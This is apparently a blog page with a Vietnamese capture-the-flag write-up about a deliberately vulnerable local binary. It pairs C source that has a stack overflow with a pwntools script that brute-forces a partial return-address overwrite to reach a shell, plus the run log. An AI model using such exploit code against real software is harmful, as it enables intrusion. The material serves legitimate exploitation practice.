<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js dark">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>training - brute pie - Hjn4 Blog</title>


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="../../../theme/css/additional.css">

    </head>
    <body>
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "dark";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('dark')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var html = document.querySelector('html');
            var sidebar = null;
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="../../../homepage.html">HOME - Huy Na</a></li><li class="chapter-item affix "><li class="part-title">ROP Emporium</li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/ret2win_challenge.html">ret2win - challenge 1</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/split_challenge.html">split - challenge 2</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/callme_challenge.html">callme - challenge 3</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/write4_challenge.html">write4 - challenge 4</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/badchars_challenge.html">badchars - challenge 5</a></li><li class="chapter-item affix "><li class="part-title">Pwnable.tw</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/start_challenge.html">start</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html">orw</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/calc_challenge.html">calc</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/3x17_challenge.html">3x17</a></li><li class="chapter-item affix "><li class="part-title">Pwn_Pico</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/herelibc_challenge.html">Here's a libc </a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/hijacking_challenge.html">hijacking </a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/fermat_strins_challenge.html">fermat_strings </a></li><li class="chapter-item affix "><li class="part-title">Pwn from blabla</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html">handy shellcode</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/pwn07_challenge.html">pwn07 - ret2libc vs ROP</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html">GOT overwrite with format string</a></li><li class="chapter-item expanded "><a href="../../../blogs/PWN/Pwn_from_blabla/training_brutepie_challenge.html" class="active">training - brute pie</a></li><li class="chapter-item affix "><li class="part-title">Assembly</li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_1.html">Session 1</a></li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_2.html">Session 2</a></li><li class="chapter-item affix "><li class="part-title">RE_Pico</li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_0.html">ARMssembly 0</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_1.html">ARMssembly 1</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_2.html">ARMssembly 2</a></li><li class="chapter-item affix "><li class="part-title">Docker</li><li class="chapter-item "><a href="../../../blogs/Docker/tips.html">Some tips for ctf</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Hjn4 Blog</h1>

                    <div class="right-buttons">

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="training---brute-pie"><a class="header" href="#training---brute-pie">training - brute pie</a></h1>
<p><a href="https://github.com/Hjn4Pwn/Pwn/tree/main/pwn_from_blabla/training/chall_bof/bof_noCanary">binary file and solve code</a></p>
<h3 id="file"><a class="header" href="#file">file</a></h3>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary$ checksec bof_noCanary
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary/bof_noCanary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary$ file bof_noCanary
bof_noCanary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6aac54d927d24c8ba8aba571154604d441400e74, for GNU/Linux 3.2.0, not stripped

</code></pre>
<h3 id="source"><a class="header" href="#source">Source</a></h3>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;


void vuln(char* s)
{
    char buf[0x20];
    if(strlen(s) &gt; 0x40){
        puts(&quot;Buffer too long!!&quot;);
        _exit(-1);
    }
    memcpy(buf,s,strlen(s));
}

int main(int argc, char** argv, char** envp)
{
    if(argc != 2){
        printf(&quot;Usage: %s &lt;buffer&gt;\n&quot;, argv[0]);
        return -1;
    }
    if(strlen(argv[1]) &gt; 0x40){
        puts(&quot;Buffer too long!!&quot;);
        return -1;
    }
    vuln(argv[1]);
    return 0;
}
void w1n(){
    char* argv[] = { &quot;:))&quot;, NULL};
    execve(&quot;/bin/sh&quot;,argv,NULL);
}

</code></pre>
<p>Khi mà Pie được bật, thì trong đầu mình ban đầu chỉ có leak và leak. Cơ mà không khả thi khi mà muốn vào được <strong>printf hay puts</strong> cho việc leak thì đếu sẽ exit ngay sau đó. chẳng thể ghi đè return address nên chẳng có chuyện quay lại hàm main cho payload lấy shell, điều khiển luồng.</p>
<p>Cơ mà:</p>
<pre><code class="language-shell">pwndbg&gt; info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001090  __cxa_finalize@plt
0x00000000000010a0  _exit@plt
0x00000000000010b0  puts@plt
0x00000000000010c0  strlen@plt
0x00000000000010d0  printf@plt
0x00000000000010e0  execve@plt
0x00000000000010f0  memcpy@plt
0x0000000000001100  _start
0x0000000000001130  deregister_tm_clones
0x0000000000001160  register_tm_clones
0x00000000000011a0  __do_global_dtors_aux
0x00000000000011e0  frame_dummy
0x00000000000011e9  vuln
0x0000000000001249  main
0x00000000000012d4  w1n
0x0000000000001314  _fini

</code></pre>
<p>cơ chế của pie thì kiểu như libc, libc_base sẽ thay đổi mỗi khi run binary, trong khi đó offset thì không. thêm nữa, pie_base sẽ có 3 bit cuối = 0. Vậy nên khi mà pie_base + offset với offset như trên thì 3 bits cuối của addr sẽ không khác 3 bits cuối của offset với hàm tường ứng.</p>
<p>Ví dụ <strong>w1n</strong> có offset là <strong>0x12d4</strong> thì địa chỉ của hàm <strong>w1n</strong> sau khi run binary (đã cộng pie_base) sẽ 0x??..??<strong>?2d4</strong>. Còn bit thứ 4 của offset sẽ được cộng vào.EX:</p>
<p>addr sau khi run binary</p>
<pre><code class="language-shell">0x00005555555551e9  vuln
0x0000555555555249  main
0x00005555555552d4  w1n

</code></pre>
<p>pie_base lúc này sẽ là <em><strong>0x0000555555554000</strong></em> nên là ta có thể bruteforce với việc thay vì gửi cả addr win func để overwrite return addr, thì giờ chỉ cần gửi 4 bits tức 2 bytes cuối thoi, tỷ lệ là 1/16 (<strong>?2d4</strong>).</p>
<p>Phần exploit mình sẽ chọn gửi luôn <em><strong>0x52d4</strong></em> gửi nào mà vừa khớp với pie_base có 4 bits cuối là <strong>4</strong>000 thì okela.</p>
<h3 id="exploit-code"><a class="header" href="#exploit-code">exploit code</a></h3>
<pre><code class="language-python">from pwn import *

w1n_addr = 0x52d4
payload = b&quot;a&quot; * 40 + p16(w1n_addr)

while True:
    r = process(['./bof_noCanary', payload])
    r.send(b'ls;cat flag.txt')
    r.interactive()

</code></pre>
<h3 id="result"><a class="header" href="#result">result</a></h3>
<p><em>Có 1 vấn đề là hmmm script này mình vẫn chưa biết cách để auto, chứ phím enter cũng sml với mình lắm ==&quot;</em></p>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary$ python3 exploit.py
[+] Starting local process './bof_noCanary': pid 6787
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6787)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6790
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6790)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6799
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6799)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6802
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6802)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6805
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6805)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6808
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6808)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6811
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6811)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6814
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6814)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6817
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6817)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6820
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6820)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6823
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6823)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6832
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6832)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6835
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6835)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6838
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6838)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6841
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6841)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6844
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6844)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6847
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6847)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6850
[*] Switching to interactive mode
$
bof.c  bof_noCanary  core  exploit.py  flag.txt  haiz.py  payload.txt
flag{l0ca1_fl4g_but_w3_w0n}

</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next" href="../../../blogs/Assembly/Session_1.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next" href="../../../blogs/Assembly/Session_1.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
